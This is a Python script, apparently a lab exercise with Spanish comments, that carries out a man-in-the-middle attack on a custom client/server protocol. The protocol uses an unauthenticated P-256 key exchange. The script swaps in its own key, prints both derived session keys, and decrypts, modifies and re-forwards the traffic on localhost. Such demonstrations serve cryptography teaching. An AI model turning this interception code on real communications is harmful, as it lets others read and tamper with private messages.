import socket
import threading
from P256 import generar_clave_privada, obtener_clave_publica, calcular_secreto_compartido, serializar_clave_publica, deserializar_clave_publica
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import os

def generate_symmetric_key(shared_key):
    shared_key_bytes = str(shared_key).encode()
    return hashlib.sha256(shared_key_bytes).digest()

def encrypt_message(key, plaintext):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return iv + ciphertext

def decrypt_message(key, ciphertext):
    iv = ciphertext[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext[16:]), AES.block_size)
    return plaintext.decode()


class MitMAttack:
    def __init__(self, client_host, client_port, server_host, server_port):
        self.client_host = client_host
        self.client_port = client_port
        self.server_host = server_host
        self.server_port = server_port
        
        self.mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_key = None
        self.server_key = None

    def setup_connections(self):
        # Intentar enlazar al socket MitM
        try:
            self.mitm_socket.bind((self.client_host, self.client_port))
            self.mitm_socket.listen(1)
            print(f"Atacante escuchando en {self.client_host}:{self.client_port}")
        except OSError as e:
            print(f"Error al enlazar al puerto {self.client_port}: {e}")
            print("Intenta cambiar el puerto del atacante en el script.")
            exit(1)

        # Conectar al servidor
        try:
            self.server_socket.connect((self.server_host, self.server_port))
            print(f"Conectado al servidor en {self.server_host}:{self.server_port}")
        except ConnectionRefusedError:
            print(f"No se pudo conectar al servidor en {self.server_host}:{self.server_port}")
            print("Asegúrate de que el servidor esté en ejecución.")
            self.mitm_socket.close()
            exit(1)

    # ... (el resto de los métodos permanecen igual)
    def handle_key_exchange(self):
        # Generar claves para el atacante
        attacker_private_key = generar_clave_privada()
        attacker_public_key = obtener_clave_publica(attacker_private_key)
        attacker_public_key_serialized = serializar_clave_publica(attacker_public_key)
        
        # Recibir clave pública del cliente
        client_public_key_serialized = self.client_conn.recv(1024)
        client_public_key = deserializar_clave_publica(client_public_key_serialized)
        
        # Enviar clave pública del atacante al cliente
        self.client_conn.send(attacker_public_key_serialized)
        
        # Calcular clave compartida con el cliente
        shared_key_client = calcular_secreto_compartido(attacker_private_key, client_public_key)
        self.client_key = generate_symmetric_key(shared_key_client)
        
        # Enviar clave pública del atacante al servidor
        self.server_socket.send(attacker_public_key_serialized)
        
        # Recibir clave pública del servidor
        server_public_key_serialized = self.server_socket.recv(1024)
        server_public_key = deserializar_clave_publica(server_public_key_serialized)
        
        # Calcular clave compartida con el servidor
        shared_key_server = calcular_secreto_compartido(attacker_private_key, server_public_key)
        self.server_key = generate_symmetric_key(shared_key_server)
        
        print("Intercepción de claves completada:")
        print(f"Clave del cliente: {self.client_key.hex()}")
        print(f"Clave del servidor: {self.server_key.hex()}")

    def forward_messages(self):
        while True:
            # Recibir mensaje del cliente
            encrypted_client_message = self.client_conn.recv(1024)
            client_message = decrypt_message(self.client_key, encrypted_client_message)
            print(f"Mensaje interceptado del cliente: {client_message}")
            
            # Modificar el mensaje si lo deseas
            modified_message = client_message.upper()  # Por ejemplo, convertir a mayúsculas
            
            # Reenviar al servidor
            encrypted_server_message = encrypt_message(self.server_key, modified_message)
            self.server_socket.send(encrypted_server_message)
            
            # Recibir respuesta del servidor
            encrypted_server_response = self.server_socket.recv(1024)
            server_response = decrypt_message(self.server_key, encrypted_server_response)
            print(f"Respuesta interceptada del servidor: {server_response}")
            
            # Modificar la respuesta si lo deseas
            modified_response = server_response.lower()  # Por ejemplo, convertir a minúsculas
            
            # Reenviar al cliente
            encrypted_client_response = encrypt_message(self.client_key, modified_response)
            self.client_conn.send(encrypted_client_response)


    def start_attack(self):
        self.setup_connections()
        print("Esperando conexión del cliente...")
        self.client_conn, addr = self.mitm_socket.accept()
        print(f"Cliente conectado desde {addr}")
        
        self.handle_key_exchange()
        self.forward_messages()

if __name__ == '__main__':
    mitm = MitMAttack('127.0.0.1', 5001, '127.0.0.1', 5000)  # Cambiado a puerto 5002
    mitm.start_attack()
